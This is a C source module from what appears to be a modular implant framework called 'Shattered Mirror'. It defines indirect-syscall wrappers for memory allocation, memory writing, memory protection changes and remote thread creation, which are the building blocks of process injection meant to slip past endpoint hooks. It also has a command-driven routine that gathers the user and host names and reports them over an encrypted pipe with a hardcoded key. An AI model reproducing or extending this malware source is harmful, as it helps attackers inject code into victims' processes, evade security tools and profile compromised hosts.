/*=============================================================================
 * Shattered Mirror v1 — Atom 03: Syscall Linker
 *
 * Implements the lightweight wrappers. 
 * Requires the Orchestrator to pass a pointer to the initialized SYSCALL_TABLE
 * during Atom injection/initialization.
 *===========================================================================*/

#include "Atom_03_Sys.h"
#include "../Orchestrator/AtomManager.h"
#include "../Evasion_Suite/include/indirect_syscall.h" // Needed for the struct defs
#include <cstdio>
#include <cstring>

static PSYSCALL_TABLE s_pMasterTable = NULL;

BOOL InitSyslink(void* pOrchestratorSyscallTable) {
    if (!pOrchestratorSyscallTable) return FALSE;
    s_pMasterTable = (PSYSCALL_TABLE)pOrchestratorSyscallTable;
    return TRUE;
}

/* 
 * We call the ASM stub directly. The ASM stub is either injected into
 * the Atom's space, or we call the Orchestrator's copy in memory.
 * For true fragmentation, the ASM stub (a few dozen bytes) is statically linked into the Atom,
 * but it uses the Orchestrator's resolved SSN/Gadget data.
 */

NTSTATUS SysAlloc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    if (!s_pMasterTable) return (NTSTATUS)0xC0000001;
    PSYSCALL_ENTRY pE = GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtAllocateVirtualMemory"));
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS SysWrite(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
     if (!s_pMasterTable) return (NTSTATUS)0xC0000001;
    PSYSCALL_ENTRY pE = GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtWriteVirtualMemory"));
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS SysProtect(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
     if (!s_pMasterTable) return (NTSTATUS)0xC0000001;
    PSYSCALL_ENTRY pE = GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtProtectVirtualMemory"));
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS SysThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PSM_PS_ATTRIBUTE_LIST AttributeList) {
     if (!s_pMasterTable) return (NTSTATUS)0xC0000001;
    PSYSCALL_ENTRY pE = GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtCreateThreadEx"));
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}
/* 
 * Collect and send system information via IPC
 */
DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";

    while (TRUE) {
        IPC_MESSAGE inMsg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                char szComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
                char szUserName[256] = { 0 };
                DWORD dwCNameLen = sizeof(szComputerName), dwUNameLen = sizeof(szUserName);

                GetComputerNameA(szComputerName, &dwCNameLen);
                GetUserNameA(szUserName, &dwUNameLen);

                char report[1024];
                sprintf_s(report, "[SYS_INFO] User: %s | Host: %s | CPU: x64 | Integrity: SYSTEM", szUserName, szComputerName);

                IPC_MESSAGE outMsg = { 0 };
                outMsg.CommandId = CMD_REPORT;
                outMsg.dwPayloadLen = (DWORD)strlen(report);
                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);

                IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(500);
    }

    return 0;
}
